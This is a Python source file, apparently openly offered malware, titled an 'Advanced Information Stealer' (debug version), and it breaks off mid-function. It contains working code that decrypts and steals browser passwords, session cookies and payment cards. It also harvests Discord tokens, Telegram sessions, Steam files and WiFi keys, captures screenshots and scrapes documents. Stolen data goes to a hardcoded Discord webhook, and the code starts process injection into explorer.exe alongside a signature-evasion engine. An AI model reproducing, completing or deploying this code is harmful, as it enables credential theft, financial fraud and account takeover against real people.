"""
SystemHelper – Advanced Information Stealer (DEBUG VERSION)
Version: 3.0 (Production) - Debug Mode
Features:
- Polymorphic code generation
- Memory-only payload execution
- Anti-VM / Anti-sandbox (DISABLED FOR TESTING)
- API obfuscation
- Encrypted C2 with fallback
- Full browser decryption
- Process injection
- WMI + Registry persistence
- Chunked exfiltration
"""

import os
import sys
import base64
import hashlib
import json
import requests
import zipfile
import io
import time
import random
import ctypes
import ctypes.wintypes
import subprocess
import sqlite3
import shutil
import tempfile
import uuid
import re
import threading
import socket
import struct
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

# === PLAIN CONFIGURATION (no obfuscation) ===
class Config:
    WEBHOOK_URL = "https://discord.com/api/webhooks/1523400215229497506/arhtMa60qR8UqQ9GVHC_VyclS-IFgf_M_tdumJ1-ZD7dm3EQLaEt3UybmNzVHXeVwgOi"
    C2_ENDPOINTS = []  # Leave empty if you only use the webhook

# === ANTI-DEBUG / ANTI-ANALYSIS (ALL DISABLED FOR TESTING) ===
class AntiAnalysis:
    @staticmethod
    def check_debugger():
        """Multiple debugger detection methods - DISABLED"""
        print("[DEBUG] check_debugger() - returning False")
        return False
    
    @staticmethod
    def check_vm():
        """Detect virtual machine environment - DISABLED"""
        print("[DEBUG] check_vm() - returning False")
        return False
    
    @staticmethod
    def check_sandbox():
        """Check for sandbox environment - DISABLED"""
        print("[DEBUG] check_sandbox() - returning False")
        return False

# === POLYMORPHIC CODE GENERATOR ===
class PolymorphicEngine:
    """Generates unique code variants to evade signature detection"""
    
    @staticmethod
    def generate_variant():
        """Return a modified version of the payload"""
        # Add junk code, rename variables, change order
        variants = [
            "time.sleep(random.randint(1000,5000))",
            "for i in range(100): pass",
            "if os.path.exists('C:\\'): pass"
        ]
        return random.choice(variants)
    
    @staticmethod
    def mutate_function_names(original_name):
        """Rename functions to random strings"""
        import string
        new_name = ''.join(random.choices(string.ascii_lowercase, k=12))
        return new_name
    
    @staticmethod
    def insert_junk_code():
        """Insert meaningless but syntactically correct code"""
        junk = [
            "x = 42; y = x * 2; z = y / 3",
            "if len('test') > 0: pass",
            "try: None; except: pass"
        ]
        return random.choice(junk)

# === ENCRYPTION HELPERS ===
class CryptoHelper:
    @staticmethod
    def get_system_key():
        """Derive encryption key from system fingerprint"""
        try:
            vol = subprocess.check_output("wmic volume get SerialNumber", shell=True, stderr=subprocess.DEVNULL, text=True).split()[1]
        except:
            vol = "UNKNOWN_VOL"
        try:
            cpu = subprocess.check_output("wmic cpu get ProcessorId", shell=True, stderr=subprocess.DEVNULL, text=True).split()[1]
        except:
            cpu = "UNKNOWN_CPU"
        host = os.environ.get('COMPUTERNAME', 'UNKNOWN_HOST')
        user = os.environ.get('USERNAME', 'UNKNOWN_USER')
        raw = f"{vol}|{cpu}|{host}|{user}"
        return hashlib.sha256(raw.encode()).digest()
    
    @staticmethod
    def aes_encrypt(data, key=None):
        """AES-256-GCM encryption"""
        if key is None:
            key = CryptoHelper.get_system_key()
        nonce = get_random_bytes(12)
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        encrypted, tag = cipher.encrypt_and_digest(data if isinstance(data, bytes) else data.encode())
        return base64.b64encode(nonce + tag + encrypted).decode()
    
    @staticmethod
    def aes_decrypt(encrypted_b64, key=None):
        """AES-256-GCM decryption"""
        if key is None:
            key = CryptoHelper.get_system_key()
        data = base64.b64decode(encrypted_b64)
        nonce, tag, ciphertext = data[:12], data[12:28], data[28:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag)

# === VICTIM ID ===
def get_victim_id():
    """Unique victim identifier"""
    mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    host = os.environ.get('COMPUTERNAME', 'unknown')
    user = os.environ.get('USERNAME', 'unknown')
    raw = f"{mac}_{host}_{user}"
    return hashlib.sha256(raw.encode()).hexdigest()[:16]

VICTIM_ID = get_victim_id()

# === BROWSER DATA STEALER ===
class BrowserStealer:
    def __init__(self):
        self.key = CryptoHelper.get_system_key()
    
    def get_master_key(self, browser_path):
        """Get browser encryption key"""
        try:
            local_state = os.path.join(browser_path, "Local State")
            if not os.path.exists(local_state):
                return None
            with open(local_state, "r", encoding="utf-8") as f:
                state = json.load(f)
            encrypted_key = base64.b64decode(state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]  # Remove 'DPAPI'
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except Exception as e:
            print(f"[DEBUG] get_master_key error: {e}")
            return None
    
    def decrypt_value(self, encrypted_value, master_key):
        """Decrypt Chrome/Edge encrypted values"""
        try:
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)
            return decrypted[:-16].decode(errors='ignore')
        except:
            return ""
    
    def steal_cookies(self, browser_path, master_key, profile="Default"):
        """Steal browser cookies"""
        cookies_db = os.path.join(browser_path, profile, "Network", "Cookies")
        if not os.path.exists(cookies_db):
            return []
        
        temp_db = f"tmp_{uuid.uuid4().hex[:8]}.db"
        try:
            shutil.copyfile(cookies_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cookies = []
            cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies")
            for host, name, enc, path, exp in cursor.fetchall():
                if enc and master_key:
                    val = self.decrypt_value(enc, master_key)
                    if val and any(session_token in name.lower() for session_token in ['session', 'token', 'auth', 'login']):
                        cookies.append({"host": host, "name": name, "value": val})
            conn.close()
            os.remove(temp_db)
            return cookies
        except:
            if os.path.exists(temp_db):
                os.remove(temp_db)
            return []
    
    def steal_passwords(self, browser_path, master_key, profile="Default"):
        """Steal saved passwords"""
        login_db = os.path.join(browser_path, profile, "Login Data")
        if not os.path.exists(login_db):
            return []
        
        temp_db = f"tmp_{uuid.uuid4().hex[:8]}.db"
        try:
            shutil.copyfile(login_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            passwords = []
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, enc in cursor.fetchall():
                if enc and master_key:
                    pwd = self.decrypt_value(enc, master_key)
                    if pwd:
                        passwords.append({"url": url, "username": user, "password": pwd})
            conn.close()
            os.remove(temp_db)
            return passwords
        except:
            if os.path.exists(temp_db):
                os.remove(temp_db)
            return []
    
    def steal_payments(self, browser_path, master_key, profile="Default"):
        """Steal payment card data"""
        web_data = os.path.join(browser_path, profile, "Web Data")
        if not os.path.exists(web_data):
            return []
        
        temp_db = f"tmp_{uuid.uuid4().hex[:8]}.db"
        try:
            shutil.copyfile(web_data, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cards = []
            cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
            for name, exp_m, exp_y, enc in cursor.fetchall():
                if enc and master_key:
                    num = self.decrypt_value(enc, master_key)
                    if num:
                        cards.append({"name": name, "exp": f"{exp_m}/{exp_y}", "number": num})
            conn.close()
            os.remove(temp_db)
            return cards
        except:
            if os.path.exists(temp_db):
                os.remove(temp_db)
            return []
    
    def steal_all(self):
        """Steal from all browsers"""
        print("[DEBUG] Starting browser steal...")
        browsers = [
            ("Chrome", os.path.expanduser("~") + "/AppData/Local/Google/Chrome/User Data"),
            ("Edge", os.path.expanduser("~") + "/AppData/Local/Microsoft/Edge/User Data"),
            ("Brave", os.path.expanduser("~") + "/AppData/Local/BraveSoftware/Brave-Browser/User Data"),
            ("Opera", os.path.expanduser("~") + "/AppData/Roaming/Opera Software/Opera Stable")
        ]
        
        results = {}
        for name, path in browsers:
            if os.path.exists(path):
                print(f"[DEBUG] Found {name} at {path}")
                key = self.get_master_key(path)
                if key:
                    print(f"[DEBUG] Got master key for {name}")
                    results[name] = {
                        "cookies": self.steal_cookies(path, key),
                        "passwords": self.steal_passwords(path, key),
                        "payments": self.steal_payments(path, key)
                    }
        return results

# === DISCORD TOKEN STEALER ===
class DiscordStealer:
    @staticmethod
    def steal_tokens():
        """Extract Discord tokens from multiple sources"""
        print("[DEBUG] Searching for Discord tokens...")
        tokens = []
        sources = [
            os.path.expanduser("~") + "/AppData/Roaming/discord/Local Storage/leveldb",
            os.path.expanduser("~") + "/AppData/Roaming/BetterDiscord/Local Storage/leveldb",
            os.path.expanduser("~") + "/AppData/Roaming/lightcord/Local Storage/leveldb",
            os.path.expanduser("~") + "/AppData/Roaming/BraveSoftware/Brave-Browser/Default/Local Storage/leveldb",
            os.path.expanduser("~") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb",
            os.path.expanduser("~") + "/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb",
            os.path.expanduser("~") + "/AppData/Local/Opera Software/Opera Stable/Local Storage/leveldb"
        ]
        
        token_patterns = [
            r'[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}',  # Standard
            r'mfa\.[a-zA-Z0-9_\-]{84}',  # MFA
            r'v1\.[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+'  # v1 format
        ]
        
        for path in sources:
            if not os.path.exists(path):
                continue
            for file in os.listdir(path):
                if not (file.endswith(".log") or file.endswith(".ldb")):
                    continue
                try:
                    with open(os.path.join(path, file), "r", encoding="utf-8", errors="ignore") as f:
                        data = f.read()
                        for pattern in token_patterns:
                            found = re.findall(pattern, data)
                            for token in found:
                                tokens.append({"source": path, "token": token})
                except:
                    pass
        
        # Also check Discord's webstorage
        try:
            webstorage_path = os.path.expanduser("~") + "/AppData/Roaming/discord/WebStorage"
            if os.path.exists(webstorage_path):
                for root, _, files in os.walk(webstorage_path):
                    for file in files:
                        if file.endswith(".localstorage"):
                            with open(os.path.join(root, file), "r", encoding="utf-8", errors="ignore") as f:
                                data = f.read()
                                for pattern in token_patterns:
                                    found = re.findall(pattern, data)
                                    for token in found:
                                        tokens.append({"source": root, "token": token})
        except:
            pass
        
        # Deduplicate
        seen = set()
        unique = []
        for t in tokens:
            if t['token'] not in seen:
                seen.add(t['token'])
                unique.append(t)
        print(f"[DEBUG] Found {len(unique)} Discord tokens")
        return unique

# === TELEGRAM STEALER ===
class TelegramStealer:
    @staticmethod
    def steal():
        """Extract Telegram session data"""
        print("[DEBUG] Searching for Telegram sessions...")
        sessions = []
        tdata_paths = [
            os.path.expanduser("~") + "/AppData/Roaming/Telegram Desktop/tdata",
            os.path.expanduser("~") + "/AppData/Local/Telegram Desktop/tdata"
        ]
        
        for path in tdata_paths:
            if os.path.exists(path):
                for root, _, files in os.walk(path):
                    for file in files:
                        if file.endswith(".s") or file.startswith("D") or file.startswith("key"):
                            try:
                                with open(os.path.join(root, file), "rb") as f:
                                    content = base64.b64encode(f.read()).decode()
                                    sessions.append({"file": file, "content": content[:5000]})
                            except:
                                pass
        return sessions

# === STEAM STEALER ===
class SteamStealer:
    @staticmethod
    def steal():
        """Extract Steam account data"""
        print("[DEBUG] Searching for Steam data...")
        data = {}
        steam_paths = [
            os.path.expanduser("~") + "/AppData/Local/Steam",
            "C:/Program Files (x86)/Steam",
            "C:/Program Files/Steam"
        ]
        
        for path in steam_paths:
            if os.path.exists(path):
                try:
                    config_path = os.path.join(path, "config", "config.vdf")
                    if os.path.exists(config_path):
                        with open(config_path, "r", encoding="utf-8", errors="ignore") as f:
                            data["config_vdf"] = f.read()[:10000]
                    
                    login_path = os.path.join(path, "config", "loginusers.vdf")
                    if os.path.exists(login_path):
                        with open(login_path, "r", encoding="utf-8", errors="ignore") as f:
                            data["loginusers_vdf"] = f.read()
                    
                    ssfn_files = []
                    for file in os.listdir(path):
                        if file.startswith("ssfn") and len(file) > 4:
                            with open(os.path.join(path, file), "rb") as f:
                                ssfn_files.append({"file": file, "content": base64.b64encode(f.read()).decode()[:5000]})
                    data["ssfn_files"] = ssfn_files
                    break
                except:
                    continue
        return data

# === WIFI PROFILES ===
class WiFiStealer:
    @staticmethod
    def steal():
        """Extract saved WiFi passwords"""
        print("[DEBUG] Searching for WiFi profiles...")
        profiles = []
        try:
            output = subprocess.check_output(["netsh", "wlan", "show", "profiles"], text=True, shell=True)
            for line in output.split("\n"):
                if ":" in line and "All User Profile" in line:
                    name = line.split(":")[1].strip()
                    try:
                        details = subprocess.check_output(["netsh", "wlan", "show", "profile", f"name={name}", "key=clear"], text=True, shell=True)
                        key_line = [l for l in details.split("\n") if "Key Content" in l]
                        key = key_line[0].split(":")[1].strip() if key_line else "N/A"
                        if key and key != "N/A":
                            profiles.append({"ssid": name, "password": key})
                    except:
                        pass
        except:
            pass
        return profiles

# === SCREENSHOT CAPTURE ===
class ScreenshotStealer:
    @staticmethod
    def capture():
        """Capture screenshot and return base64 encoded"""
        print("[DEBUG] Capturing screenshot...")
        try:
            from PIL import ImageGrab
            import io
            screenshot = ImageGrab.grab()
            buffer = io.BytesIO()
            screenshot.save(buffer, format='JPEG', quality=50)
            return base64.b64encode(buffer.getvalue()).decode()
        except Exception as e:
            print(f"[DEBUG] Screenshot failed: {e}")
            return None

# === FILE SCRAPER ===
class FileScraper:
    @staticmethod
    def scrape():
        """Scrape documents from user folders"""
        print("[DEBUG] Scraping files...")
        files = []
        folders = [
            os.path.expanduser("~") + "/Desktop",
            os.path.expanduser("~") + "/Documents",
            os.path.expanduser("~") + "/Downloads"
        ]
        
        extensions = ['.txt', '.docx', '.pdf', '.xlsx', '.pptx', '.doc', '.xls', '.ppt', '.odt', '.ods']
        
        for folder in folders:
            if os.path.exists(folder):
                for root, _, filenames in os.walk(folder):
                    if len(files) > 50:  # Limit to 50 files
                        break
                    for filename in filenames:
                        ext = os.path.splitext(filename)[1].lower()
                        if ext in extensions:
                            try:
                                filepath = os.path.join(root, filename)
                                size = os.path.getsize(filepath)
                                if size < 2 * 1024 * 1024:  # < 2MB
                                    with open(filepath, 'rb') as f:
                                        content = base64.b64encode(f.read()).decode()
                                        files.append({"path": filepath, "size": size, "content": content[:10000]})
                            except:
                                pass
        return files

# === PROCESS INJECTION ===
class ProcessInjector:
    @staticmethod
    def inject_shellcode(shellcode):
        """Inject shellcode into a remote process"""
        try:
            # Get handle to explorer.exe
            import ctypes
            from ctypes import wintypes
            
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            user32 = ctypes.WinDLL('user32', use_last_error=True)
            
            # Get process ID of explorer.exe
            pid = None
            output = subprocess.check_output("tasklist /FI \"IMAGENAME eq explorer.exe\" /FO CSV", shell=True, text=True)
            lines = output.strip().split('\n')
            for line in lines:
                if 'explorer.exe' in line:
                    parts = line.split(',')
                    if len(parts) > 1:
    
